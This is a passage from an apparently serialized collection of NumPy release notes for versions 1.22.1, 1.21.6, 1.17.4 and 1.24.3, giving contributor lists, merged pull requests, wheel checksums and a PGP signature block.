7e957ca8112c689b728037cea9c9567c27cf912741fabda9efc2c7d33d29dfa1  numpy-1.22.1-cp310-cp310-win_amd64.whl\n    800dfeaffb2219d49377da1371d710d7952c9533b57f3d51b15e61c4269a1b5b  numpy-1.22.1-cp38-cp38-macosx_10_9_universal2.whl\n    65f5e257987601fdfc63f1d02fca4d1c44a2b85b802f03bd6abc2b0b14648dd2  numpy-1.22.1-cp38-cp38-macosx_10_9_x86_64.whl\n    632e062569b0fe05654b15ef0e91a53c0a95d08ffe698b66f6ba0f927ad267c2  numpy-1.22.1-cp38-cp38-macosx_11_0_arm64.whl\n    0d245a2bf79188d3f361137608c3cd12ed79076badd743dc660750a9f3074f7c  numpy-1.22.1-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    26b4018a19d2ad9606ce9089f3d52206a41b23de5dfe8dc947d2ec49ce45d015  numpy-1.22.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f8ad59e6e341f38266f1549c7c2ec70ea0e3d1effb62a44e5c3dba41c55f0187  numpy-1.22.1-cp38-cp38-win32.whl\n    60f19c61b589d44fbbab8ff126640ae712e163299c2dd422bfe4edc7ec51aa9b  numpy-1.22.1-cp38-cp38-win_amd64.whl\n    2db01d9838a497ba2aa9a87515aeaf458f42351d72d4e7f3b8ddbd1eba9479f2  numpy-1.22.1-cp39-cp39-macosx_10_9_universal2.whl\n    bcd19dab43b852b03868796f533b5f5561e6c0e3048415e675bec8d2e9d286c1  numpy-1.22.1-cp39-cp39-macosx_10_9_x86_64.whl\n    78bfbdf809fc236490e7e65715bbd98377b122f329457fffde206299e163e7f3  numpy-1.22.1-cp39-cp39-macosx_11_0_arm64.whl\n    c51124df17f012c3b757380782ae46eee85213a3215e51477e559739f57d9bf6  numpy-1.22.1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    88d54b7b516f0ca38a69590557814de2dd638d7d4ed04864826acaac5ebb8f01  numpy-1.22.1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    b5ec9a5eaf391761c61fd873363ef3560a3614e9b4ead17347e4deda4358bca4  numpy-1.22.1-cp39-cp39-win32.whl\n    4ac4d7c9f8ea2a79d721ebfcce81705fc3cd61a10b731354f1049eb8c99521e8  numpy-1.22.1-cp39-cp39-win_amd64.whl\n    e60ef82c358ded965fdd3132b5738eade055f48067ac8a5a8ac75acc00cad31f  numpy-1.22.1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    dd1968402ae20dfd59b34acd799b494be340c774f6295e9bf1c2b9842a5e416d  numpy-1.22.1.tar.gz\n    e348ccf5bc5235fc405ab19d53bec215bb373300e5523c7b476cc0da8a5e9973  numpy-1.22.1.zip\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.21.6": "==========================\n\nNumPy 1.21.6 is a very small release that achieves two things:\n\n- Backs out the mistaken backport of C++ code into 1.21.5.\n- Provides a 32 bit Windows wheel for Python 3.10.\n\nThe provision of the 32 bit wheel is intended to make life easier\nfor oldest-supported-numpy.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    5a3e5d7298056bcfbc3246597af474d4  numpy-1.21.6-cp310-cp310-macosx_10_9_universal2.whl\n    d981d2859842e7b62dc93e24808c7bac  numpy-1.21.6-cp310-cp310-macosx_10_9_x86_64.whl\n    171313893c26529404d09fadb3537ed3  numpy-1.21.6-cp310-cp310-macosx_11_0_arm64.whl\n    5a7a6dfdd43069f9b29d3fe6b7f3a2ce  numpy-1.21.6-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a9e25375a72725c5d74442eda53af405  numpy-1.21.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    6f9a782477380b2cdb7606f6f7634c00  numpy-1.21.6-cp310-cp310-win32.whl\n    32a73a348864700a3fa510d2fc4350b7  numpy-1.21.6-cp310-cp310-win_amd64.whl\n    0db8941ebeb0a02cd839d9cd3c5c20bb  numpy-1.21.6-cp37-cp37m-macosx_10_9_x86_64.whl\n    67882155be9592850861f4ad8ba36623  numpy-1.21.6-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    c70e30e1ff9ab49f898c19e7a6492ae6  numpy-1.21.6-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    e32dbd291032c7554a742f1bb9b2f7a3  numpy-1.21.6-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    689bf804c2cd16cb241fd943e3833ffd  numpy-1.21.6-cp37-cp37m-win32.whl\n    0062a7b0231a07cb5b9f3d7c495e6fe4  numpy-1.21.6-cp37-cp37m-win_amd64.whl\n    0d08809980ab497659e7aa0df9ce120e  numpy-1.21.6-cp38-cp38-macosx_10_9_universal2.whl\n    3c67d14ea2009069844b27bfbf74304d  numpy-1.21.6-cp38-cp38-macosx_10_9_x86_64.whl\n    5f0e773745cb817313232ac1bf4c7eee  numpy-1.21.6-cp38-cp38-macosx_11_0_arm64.whl\n    fa8011e065f1964d3eb870bb3926fc99  numpy-1.21.6-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    486cf9d4daab59aad253aa5b84a5aa83  numpy-1.21.6-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    88509abab303c076dfb26f00e455180d  numpy-1.21.6-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    f7234e2ef837f5f6ddbde8db246fd05b  numpy-1.21.6-cp38-cp38-win32.whl\n    e1063e01fb44ea7a49adea0c33548217  numpy-1.21.6-cp38-cp38-win_amd64.whl\n    61c4caad729e3e0e688accbc1424ed45  numpy-1.21.6-cp39-cp39-macosx_10_9_universal2.whl\n    67488d8ccaeff798f2e314aae7c4c3d6  numpy-1.21.6-cp39-cp39-macosx_10_9_x86_64.whl\n    128c3713b5d1de45a0f522562bac5263  numpy-1.21.6-cp39-cp39-macosx_11_0_arm64.whl\n    50e79cd0610b4ed726b3bf08c3716dab  numpy-1.21.6-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    bd0c9e3c0e488faac61daf3227fb95af  numpy-1.21.6-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    aa5e9baf1dec16b15e481c23f8a23214  numpy-1.21.6-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a2405b0e5d3f775ad30177296a997092  numpy-1.21.6-cp39-cp39-win32.whl\n    f0d20eda8c78f957ea70c5527954303e  numpy-1.21.6-cp39-cp39-win_amd64.whl\n    9682abbcc38cccb7f56e48aacca7de23  numpy-1.21.6-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    6aa3c2e8ea2886bf593bd8e0a1425c64  numpy-1.21.6.tar.gz\n    04aea95dcb1d256d13a45df42173aa1e  numpy-1.21.6.zip\n\nSHA256\n------\n::\n\n    8737609c3bbdd48e380d463134a35ffad3b22dc56295eff6f79fd85bd0eeeb25  numpy-1.21.6-cp310-cp310-macosx_10_9_universal2.whl\n    fdffbfb6832cd0b300995a2b08b8f6fa9f6e856d562800fea9182316d99c4e8e  numpy-1.21.6-cp310-cp310-macosx_10_9_x86_64.whl\n    3820724272f9913b597ccd13a467cc492a0da6b05df26ea09e78b171a0bb9da6  numpy-1.21.6-cp310-cp310-macosx_11_0_arm64.whl\n    f17e562de9edf691a42ddb1eb4a5541c20dd3f9e65b09ded2beb0799c0cf29bb  numpy-1.21.6-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5f30427731561ce75d7048ac254dbe47a2ba576229250fb60f0fb74db96501a1  numpy-1.21.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d4bf4d43077db55589ffc9009c0ba0a94fa4908b9586d6ccce2e0b164c86303c  numpy-1.21.6-cp310-cp310-win32.whl\n    d136337ae3cc69aa5e447e78d8e1514be8c3ec9b54264e680cf0b4bd9011574f  numpy-1.21.6-cp310-cp310-win_amd64.whl\n    6aaf96c7f8cebc220cdfc03f1d5a31952f027dda050e5a703a0d1c396075e3e7  numpy-1.21.6-cp37-cp37m-macosx_10_9_x86_64.whl\n    67c261d6c0a9981820c3a149d255a76918278a6b03b6a036800359aba1256d46  numpy-1.21.6-cp37-cp37m-manylinux_2_12_i686.manylinux2010_i686.whl\n    a6be4cb0ef3b8c9250c19cc122267263093eee7edd4e3fa75395dfda8c17a8e2  numpy-1.21.6-cp37-cp37m-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    7c4068a8c44014b2d55f3c3f574c376b2494ca9cc73d2f1bd692382b6dffe3db  numpy-1.21.6-cp37-cp37m-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7c7e5fa88d9ff656e067876e4736379cc962d185d5cd808014a8a928d529ef4e  numpy-1.21.6-cp37-cp37m-win32.whl\n    bcb238c9c96c00d3085b264e5c1a1207672577b93fa666c3b14a45240b14123a  numpy-1.21.6-cp37-cp37m-win_amd64.whl\n    82691fda7c3f77c90e62da69ae60b5ac08e87e775b09813559f8901a88266552  numpy-1.21.6-cp38-cp38-macosx_10_9_universal2.whl\n    643843bcc1c50526b3a71cd2ee561cf0d8773f062c8cbaf9ffac9fdf573f83ab  numpy-1.21.6-cp38-cp38-macosx_10_9_x86_64.whl\n    357768c2e4451ac241465157a3e929b265dfac85d9214074985b1786244f2ef3  numpy-1.21.6-cp38-cp38-macosx_11_0_arm64.whl\n    9f411b2c3f3d76bba0865b35a425157c5dcf54937f82bbeb3d3c180789dd66a6  numpy-1.21.6-cp38-cp38-manylinux_2_12_i686.manylinux2010_i686.whl\n    4aa48afdce4660b0076a00d80afa54e8a97cd49f457d68a4342d188a09451c1a  numpy-1.21.6-cp38-cp38-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    d6a96eef20f639e6a97d23e57dd0c1b1069a7b4fd7027482a4c5c451cd7732f4  numpy-1.21.6-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    5c3c8def4230e1b959671eb959083661b4a0d2e9af93ee339c7dada6759a9470  numpy-1.21.6-cp38-cp38-win32.whl\n    bf2ec4b75d0e9356edea834d1de42b31fe11f726a81dfb2c2112bc1eaa508fcf  numpy-1.21.6-cp38-cp38-win_amd64.whl\n    4391bd07606be175aafd267ef9bea87cf1b8210c787666ce82073b05f202add1  numpy-1.21.6-cp39-cp39-macosx_10_9_universal2.whl\n    67f21981ba2f9d7ba9ade60c9e8cbaa8cf8e9ae51673934480e45cf55e953673  numpy-1.21.6-cp39-cp39-macosx_10_9_x86_64.whl\n    ee5ec40fdd06d62fe5d4084bef4fd50fd4bb6bfd2bf519365f569dc470163ab0  numpy-1.21.6-cp39-cp39-macosx_11_0_arm64.whl\n    1dbe1c91269f880e364526649a52eff93ac30035507ae980d2fed33aaee633ac  numpy-1.21.6-cp39-cp39-manylinux_2_12_i686.manylinux2010_i686.whl\n    d9caa9d5e682102453d96a0ee10c7241b72859b01a941a397fd965f23b3e016b  numpy-1.21.6-cp39-cp39-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    58459d3bad03343ac4b1b42ed14d571b8743dc80ccbf27444f266729df1d6f5b  numpy-1.21.6-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    7f5ae4f304257569ef3b948810816bc87c9146e8c446053539947eedeaa32786  numpy-1.21.6-cp39-cp39-win32.whl\n    e31f0bb5928b793169b87e3d1e070f2342b22d5245c755e2b81caa29756246c3  numpy-1.21.6-cp39-cp39-win_amd64.whl\n    dd1c8f6bd65d07d3810b90d02eba7997e32abbdf1277a481d698969e921a3be0  numpy-1.21.6-pp37-pypy37_pp73-manylinux_2_12_x86_64.manylinux2010_x86_64.whl\n    d4efc6491a1cdc00f9eca9bf2c1aa13671776f6941c7321ddf75b45c862f0c2c  numpy-1.21.6.tar.gz\n    ecb55251139706669fdec2ff073c98ef8e9a84473e51e716211b41aa0f18e656  numpy-1.21.6.zip\n\n\n-----BEGIN PGP SIGNED MESSAGE-----\nHash: SHA256\n\n.. currentmodule:: numpy\n\n==========================\n", "1.17.4": "==========================\n\nThis release contains fixes for bugs reported against NumPy 1.17.3 along with\nsome build improvements. The Python versions supported in this release\nare 3.5-3.8.\n\nDownstream developers should use Cython >= 0.29.13 for Python 3.8 support and\nOpenBLAS >= 3.7 to avoid errors on the Skylake architecture.\n\n\nHighlights\n==========\n\n- - Fixed `random.random_integers` biased generation of 8 and 16 bit integers.\n- - Fixed `np.einsum` regression on Power9 and z/Linux.\n- - Fixed histogram problem with signed integer arrays.\n\n\nContributors\n============\n\nA total of 5 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Charles Harris\n* Chris Burr +\n* Matti Picus\n* Qiming Sun +\n* Warren Weckesser\n\n\nPull requests merged\n====================\n\nA total of 8 pull requests were merged for this release.\n\n* `14758 <https://github.com/numpy/numpy/pull/14758>`__: BLD: declare support for python 3.8\n* `14781 <https://github.com/numpy/numpy/pull/14781>`__: BUG: random: biased samples from integers() with 8 or 16 bit...\n* `14851 <https://github.com/numpy/numpy/pull/14851>`__: BUG: Fix _ctypes class circular reference. (#13808)\n* `14852 <https://github.com/numpy/numpy/pull/14852>`__: BLD: add 'apt update' to shippable\n* `14855 <https://github.com/numpy/numpy/pull/14855>`__: BUG: Fix `np.einsum` errors on Power9 Linux and z/Linux\n* `14857 <https://github.com/numpy/numpy/pull/14857>`__: BUG: lib: Fix histogram problem with signed integer arrays.\n* `14858 <https://github.com/numpy/numpy/pull/14858>`__: BLD: Prevent -flto from optimising long double representation...\n* `14866 <https://github.com/numpy/numpy/pull/14866>`__: MAINT: move buffer.h -> npy_buffer.h to avoid conflicts\n\n\nChecksums\n=========\n\nMD5\n- ---\n\n    1d5b9a989a22e2c5d0774d9a8e19f3db  numpy-1.17.4-cp35-cp35m-macosx_10_6_intel.whl\n    3b3fc8a8db5a026349b3ead44e755bc5  numpy-1.17.4-cp35-cp35m-manylinux1_i686.whl\n    bfcafd2994423e9ed8337eb4a10cc885  numpy-1.17.4-cp35-cp35m-manylinux1_x86_64.whl\n    8196de4edb9f37578acab2749e2af61c  numpy-1.17.4-cp35-cp35m-win32.whl\n    71292c5b45feec7cae81a1fc6272b0e0  numpy-1.17.4-cp35-cp35m-win_amd64.whl\n    39cfbfdf236a20f9901b918b39e20e54  numpy-1.17.4-cp36-cp36m-macosx_10_9_x86_64.whl\n    8cff96c6bc944b44b7232d72244e0838  numpy-1.17.4-cp36-cp36m-manylinux1_i686.whl\n    d62a4e3880432bb8deec3a51bcc8a30e  numpy-1.17.4-cp36-cp36m-manylinux1_x86_64.whl\n    aaa948d1ef36659450791229a966ed19  numpy-1.17.4-cp36-cp36m-win32.whl\n    e4482c52d63ab698d2e81ad71903b64b  numpy-1.17.4-cp36-cp36m-win_amd64.whl\n    4fadb49558c6089d8f8f32d775de91ae  numpy-1.17.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    2e3a09d2aefd90856600c821db49cf99  numpy-1.17.4-cp37-cp37m-manylinux1_i686.whl\n    2f0527f8eedcb2b3d83912dd254356f9  numpy-1.17.4-cp37-cp37m-manylinux1_x86_64.whl\n    aded41f748a1dc3f71924200c3fe1bc0  numpy-1.17.4-cp37-cp37m-win32.whl\n    34a187a48ceb4378ac28c6951d7f8dd6  numpy-1.17.4-cp37-cp37m-win_amd64.whl\n    f5da7b0b94eacde2898654cfc25e8e78  numpy-1.17.4-cp38-cp38-macosx_10_9_x86_64.whl\n    08f4a5d6ea64c3f1f22ff9e4da4b55dd  numpy-1.17.4-cp38-cp38-manylinux1_i686.whl\n    bafe3eb23ae8cb6f062e55c7aab52a98  numpy-1.17.4-cp38-cp38-manylinux1_x86_64.whl\n    0f1add30eb00bf40e5456e8ab10b5342  numpy-1.17.4-cp38-cp38-win32.whl\n    11649cda484b4d0d4426c3dab2c8ed5f  numpy-1.17.4-cp38-cp38-win_amd64.whl\n    9147c3ee75e58d657b5b8b5a4f3564e0  numpy-1.17.4.tar.gz\n    d7d3563cca0b99ba68a3f064a9e46ebe  numpy-1.17.4.zip\n\nSHA256\n- ------\n\n    ede47b98de79565fcd7f2decb475e2dcc85ee4097743e551fe26cfc7eb3ff143  numpy-1.17.4-cp35-cp35m-macosx_10_6_intel.whl\n    43bb4b70585f1c2d153e45323a886839f98af8bfa810f7014b20be714c37c447  numpy-1.17.4-cp35-cp35m-manylinux1_i686.whl\n    c7354e8f0eca5c110b7e978034cd86ed98a7a5ffcf69ca97535445a595e07b8e  numpy-1.17.4-cp35-cp35m-manylinux1_x86_64.whl\n    64874913367f18eb3013b16123c9fed113962e75d809fca5b78ebfbb73ed93ba  numpy-1.17.4-cp35-cp35m-win32.whl\n    6ca4000c4a6f95a78c33c7dadbb9495c10880be9c89316aa536eac359ab820ae  numpy-1.17.4-cp35-cp35m-win_amd64.whl\n    75fd817b7061f6378e4659dd792c84c0b60533e867f83e0d1e52d5d8e53df88c  numpy-1.17.4-cp36-cp36m-macosx_10_9_x86_64.whl\n    7d81d784bdbed30137aca242ab307f3e65c8d93f4c7b7d8f322110b2e90177f9  numpy-1.17.4-cp36-cp36m-manylinux1_i686.whl\n    fe39f5fd4103ec4ca3cb8600b19216cd1ff316b4990f4c0b6057ad982c0a34d5  numpy-1.17.4-cp36-cp36m-manylinux1_x86_64.whl\n    e467c57121fe1b78a8f68dd9255fbb3bb3f4f7547c6b9e109f31d14569f490c3  numpy-1.17.4-cp36-cp36m-win32.whl\n    8d0af8d3664f142414fd5b15cabfd3b6cc3ef242a3c7a7493257025be5a6955f  numpy-1.17.4-cp36-cp36m-win_amd64.whl\n    9679831005fb16c6df3dd35d17aa31dc0d4d7573d84f0b44cc481490a65c7725  numpy-1.17.4-cp37-cp37m-macosx_10_9_x86_64.whl\n    acbf5c52db4adb366c064d0b7c7899e3e778d89db585feadd23b06b587d64761  numpy-1.17.4-cp37-cp37m-manylinux1_i686.whl\n    3d52298d0be333583739f1aec9026f3b09fdfe3ddf7c7028cb16d9d2af1cca7e  numpy-1.17.4-cp37-cp37m-manylinux1_x86_64.whl\n    475963c5b9e116c38ad7347e154e5651d05a2286d86455671f5b1eebba5feb76  numpy-1.17.4-cp37-cp37m-win32.whl\n    0c0763787133dfeec19904c22c7e358b231c87ba3206b211652f8cbe1241deb6  numpy-1.17.4-cp37-cp37m-win_amd64.whl\n    683828e50c339fc9e68720396f2de14253992c495fdddef77a1e17de55f1decc  numpy-1.17.4-cp38-cp38-macosx_10_9_x86_64.whl\n    e2e9d8c87120ba2c591f60e32736b82b67f72c37ba88a4c23c81b5b8fa49c018  numpy-1.17.4-cp38-cp38-manylinux1_i686.whl\n    a8f67ebfae9f575d85fa859b54d3bdecaeece74e3274b0b5c5f804d7ca789fe1  numpy-1.17.4-cp38-cp38-manylinux1_x86_64.whl\n    0a7a1dd123aecc9f0076934288ceed7fd9a81ba3919f11a855a7887cbe82a02f  numpy-1.17.4-cp38-cp38-win32.whl\n    ada4805ed51f5bcaa3a06d3dd94939351869c095e30a2b54264f5a5004b52170  numpy-1.17.4-cp38-cp38-win_amd64.whl\n    fb0415475e673cb9a6dd816df999e0ab9f86fa3af2b1770944e7288d2bea4ac9  numpy-1.17.4.tar.gz\n    f58913e9227400f1395c7b800503ebfdb0772f1c33ff8cb4d6451c06cabdf316  numpy-1.17.4.zip\n-----BEGIN PGP SIGNATURE-----\n\niQEzBAEBCAAdFiEEU6DlKD8F4p1xKRSeZ58ig3fFJHsFAl3Iu7cACgkQZ58ig3fF\nJHshpQf8DEr6WHUt8BbAYNtgo62A448H2exH2Wd1bupml7SXenfjOdXjTT+T1qkd\n+D58IqZlV7J0dEwxkh23kDtImLwB1SBf/1JYpJOIpBLsn+ibIUdaqpuFFKIcd+p9\ncDIgaklYpYrPryGuT23YftjD37eCGMQ9yfNeUY5kSIicFhZWxrCpRkXSXKIa9RjN\nI6iob25YLQtN1sDURz3TTFsjZee+dilS2aFVtnKom/ujW+8SBo33NKJHQl4TzhaU\nnbYFsZE//AMTLERYbZvKbRyKXSA0VYrETnIIM40nMB5ditU0exZa2y0a7Bw4ISgn\n4qkkpdetdahSAwrlbL/GX3Qv2H6CIA==\n=L05w\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.24.3": "==========================\nNumPy 1.24.3 is a maintenance release that fixes bugs and regressions discovered after the\n1.24.2 release. The Python versions supported by this release are 3.8-3.11.\n\nContributors\n============\n\nA total of 12 people contributed to this release.  People with a \"+\" by their\nnames contributed a patch for the first time.\n\n* Aleksei Nikiforov +\n* Alexander Heger\n* Bas van Beek\n* Bob Eldering\n* Brock Mendel\n* Charles Harris\n* Kyle Sunden\n* Peter Hawkins\n* Rohit Goswami\n* Sebastian Berg\n* Warren Weckesser\n* dependabot[bot]\n\nPull requests merged\n====================\n\nA total of 17 pull requests were merged for this release.\n\n* `23206 <https://github.com/numpy/numpy/pull/23206>`__: BUG: fix for f2py string scalars (#23194)\n* `23207 <https://github.com/numpy/numpy/pull/23207>`__: BUG: datetime64/timedelta64 comparisons return NotImplemented\n* `23208 <https://github.com/numpy/numpy/pull/23208>`__: MAINT: Pin matplotlib to version 3.6.3 for refguide checks\n* `23221 <https://github.com/numpy/numpy/pull/23221>`__: DOC: Fix matplotlib error in documentation\n* `23226 <https://github.com/numpy/numpy/pull/23226>`__: CI: Ensure submodules are initialized in gitpod.\n* `23341 <https://github.com/numpy/numpy/pull/23341>`__: TYP: Replace duplicate reduce in ufunc type signature with reduceat.\n* `23342 <https://github.com/numpy/numpy/pull/23342>`__: TYP: Remove duplicate CLIP/WRAP/RAISE in ``__init__.pyi``.\n* `23343 <https://github.com/numpy/numpy/pull/23343>`__: TYP: Mark ``d`` argument to fftfreq and rfftfreq as optional...\n* `23344 <https://github.com/numpy/numpy/pull/23344>`__: TYP: Add type annotations for comparison operators to MaskedArray.\n* `23345 <https://github.com/numpy/numpy/pull/23345>`__: TYP: Remove some stray type-check-only imports of ``msort``\n* `23370 <https://github.com/numpy/numpy/pull/23370>`__: BUG: Ensure like is only stripped for ``like=`` dispatched functions\n* `23543 <https://github.com/numpy/numpy/pull/23543>`__: BUG: fix loading and storing big arrays on s390x\n* `23544 <https://github.com/numpy/numpy/pull/23544>`__: MAINT: Bump larsoner/circleci-artifacts-redirector-action\n* `23634 <https://github.com/numpy/numpy/pull/23634>`__: BUG: Ignore invalid and overflow warnings in masked setitem\n* `23635 <https://github.com/numpy/numpy/pull/23635>`__: BUG: Fix masked array raveling when ``order=\"A\"`` or ``order=\"K\"``\n* `23636 <https://github.com/numpy/numpy/pull/23636>`__: MAINT: Update conftest for newer hypothesis versions\n* `23637 <https://github.com/numpy/numpy/pull/23637>`__: BUG: Fix bug in parsing F77 style string arrays.\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    93a3ce07e3773842c54d831f18e3eb8d  numpy-1.24.3-cp310-cp310-macosx_10_9_x86_64.whl\n    39691ff3d1612438dfcd3266c9765aab  numpy-1.24.3-cp310-cp310-macosx_11_0_arm64.whl\n    a99234799a239e7e9c6fa15c212996df  numpy-1.24.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    3673aa638746851dd19d5199e1eb3a91  numpy-1.24.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3c72962360bcd0938a6bddee6cdca766  numpy-1.24.3-cp310-cp310-win32.whl\n    a3329efa646012fa4ee06ce5e08eadaf  numpy-1.24.3-cp310-cp310-win_amd64.whl\n    5323fb0323d1ec10ee3c35a2fa79cbcd  numpy-1.24.3-cp311-cp311-macosx_10_9_x86_64.whl\n    cfa001dcd07cdf6414ced433e88959d4  numpy-1.24.3-cp311-cp311-macosx_11_0_arm64.whl\n    d75bbfb06ed00d04232dce0e865eb42c  numpy-1.24.3-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    fe18b810bcf284572467ce585dbc533b  numpy-1.24.3-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    e97699a4ef96a81e0916bdf15440abe0  numpy-1.24.3-cp311-cp311-win32.whl\n    e6de5b7d77dc43ed47f516eb10bbe8b6  numpy-1.24.3-cp311-cp311-win_amd64.whl\n    dd04ebf441a8913f4900b56e7a33a75e  numpy-1.24.3-cp38-cp38-macosx_10_9_x86_64.whl\n    e47ac5521b0bfc3effb040072d8a7902  numpy-1.24.3-cp38-cp38-macosx_11_0_arm64.whl\n    7b7dae3309e7ca8a8859633a5d337431  numpy-1.24.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8cc87b88163ed84e70c48fd0f5f8f20e  numpy-1.24.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    350934bae971d0ebe231a59b640069db  numpy-1.24.3-cp38-cp38-win32.whl\n    c4708ef009bb5d427ea94a4fc4a10e12  numpy-1.24.3-cp38-cp38-win_amd64.whl\n    44b08a293a4e12d62c27b8f15ba5664e  numpy-1.24.3-cp39-cp39-macosx_10_9_x86_64.whl\n    3ae7ac30f86c720e42b2324a0ae1adf5  numpy-1.24.3-cp39-cp39-macosx_11_0_arm64.whl\n    065464a8d918c670c7863d1e72e3e6dd  numpy-1.24.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    1f163b9ea417c253e84480aa8d99dee6  numpy-1.24.3-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c86e648389e333e062bea11c749b9a32  numpy-1.24.3-cp39-cp39-win32.whl\n    bfe332e577c604d6d62a57381e6aa0a6  numpy-1.24.3-cp39-cp39-win_amd64.whl\n    374695eeef5aca32a5b7f2f518dd3ba1  numpy-1.24.3-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    6abd9dba54405182e6e7bb32dbe377bb  numpy-1.24.3-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    0848bd41c08dd5ebbc5a7f0788678e0e  numpy-1.24.3-pp38-pypy38_pp73-win_amd64.whl\n    89e5e2e78407032290ae6acf6dcaea46  numpy-1.24.3.tar.gz\n\nSHA256\n------\n::\n\n    3c1104d3c036fb81ab923f507536daedc718d0ad5a8707c6061cdfd6d184e570  numpy-1.24.3-cp310-cp310-macosx_10_9_x86_64.whl\n    202de8f38fc4a45a3eea4b63e2f376e5f2dc64ef0fa692838e31a808520efaf7  numpy-1.24.3-cp310-cp310-macosx_11_0_arm64.whl\n    8535303847b89aa6b0f00aa1dc62867b5a32923e4d1681a35b5eef2d9591a463  numpy-1.24.3-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    2d926b52ba1367f9acb76b0df6ed21f0b16a1ad87c6720a1121674e5cf63e2b6  numpy-1.24.3-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f21c442fdd2805e91799fbe044a7b999b8571bb0ab0f7850d0cb9641a687092b  numpy-1.24.3-cp310-cp310-win32.whl\n    ab5f23af8c16022663a652d3b25dcdc272ac3f83c3af4c02eb8b824e6b3ab9d7  numpy-1.24.3-cp310-cp310-win_amd64.whl\n    9a7721ec204d3a237225db3e194c25268faf92e19338a35f3a224469cb6039a3  numpy-1.24.3-cp311-cp311-macosx_10_9_x86_64.whl\n    d6cc757de514c00b24ae8cf5c876af2a7c3df189028d68c0cb4eaa9cd5afc2bf  numpy-1.24.3-cp311-cp311-macosx_11_0_arm64.whl\n    76e3f4e85fc5d4fd311f6e9b794d0c00e7002ec122be271f2019d63376f1d385  numpy-1.24.3-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    a1d3c026f57ceaad42f8231305d4653d5f05dc6332a730ae5c0bea3513de0950  numpy-1.24.3-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    c91c4afd8abc3908e00a44b2672718905b8611503f7ff87390cc0ac3423fb096  numpy-1.24.3-cp311-cp311-win32.whl\n    5342cf6aad47943286afa6f1609cad9b4266a05e7f2ec408e2cf7aea7ff69d80  numpy-1.24.3-cp311-cp311-win_amd64.whl\n    7776ea65423ca6a15255ba1872d82d207bd1e09f6d0894ee4a64678dd2204078  numpy-1.24.3-cp38-cp38-macosx_10_9_x86_64.whl\n    ae8d0be48d1b6ed82588934aaaa179875e7dc4f3d84da18d7eae6eb3f06c242c  numpy-1.24.3-cp38-cp38-macosx_11_0_arm64.whl\n    ecde0f8adef7dfdec993fd54b0f78183051b6580f606111a6d789cd14c61ea0c  numpy-1.24.3-cp38-cp38-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    4749e053a29364d3452c034827102ee100986903263e89884922ef01a0a6fd2f  numpy-1.24.3-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    d933fabd8f6a319e8530d0de4fcc2e6a61917e0b0c271fded460032db42a0fe4  numpy-1.24.3-cp38-cp38-win32.whl\n    56e48aec79ae238f6e4395886b5eaed058abb7231fb3361ddd7bfdf4eed54289  numpy-1.24.3-cp38-cp38-win_amd64.whl\n    4719d5aefb5189f50887773699eaf94e7d1e02bf36c1a9d353d9f46703758ca4  numpy-1.24.3-cp39-cp39-macosx_10_9_x86_64.whl\n    0ec87a7084caa559c36e0a2309e4ecb1baa03b687201d0a847c8b0ed476a7187  numpy-1.24.3-cp39-cp39-macosx_11_0_arm64.whl\n    ea8282b9bcfe2b5e7d491d0bf7f3e2da29700cec05b49e64d6246923329f2b02  numpy-1.24.3-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    